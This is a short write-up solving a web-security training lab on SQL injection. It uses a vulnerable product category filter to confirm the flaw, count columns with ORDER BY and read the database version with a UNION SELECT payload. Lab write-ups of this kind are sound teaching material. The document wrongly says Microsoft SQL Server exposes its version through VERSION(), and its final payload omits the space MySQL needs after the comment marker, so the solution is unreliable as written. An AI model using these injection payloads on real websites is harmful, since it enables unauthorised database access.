# SQL injection attack, querying the database type and version on MySQL and Microsoft

**Lab Url**: [https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)

## Objective

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

## Solution

The category filter is vulnerable to SQL injection. We can use a `UNION` attack to retrieve the database version.

### Step 1: Confirm injection

Append an apostrophe to the category value:

```bash
/filter?category=Accessories'
```

A **500 Internal Server Error** confirms broken SQL syntax.

### Step 2: Determine the number of columns

Use `ORDER BY` to find the column count:

```bash
/filter?category=Accessories' ORDER BY 2-- 
```

The query returns **two columns**.

### Step 3: Retrieve the database version

MySQL and Microsoft SQL Server provide the version via the `VERSION()` function:

```bash
/filter?category=Accessories' UNION SELECT NULL, VERSION()--
```

The response displays the database version string.
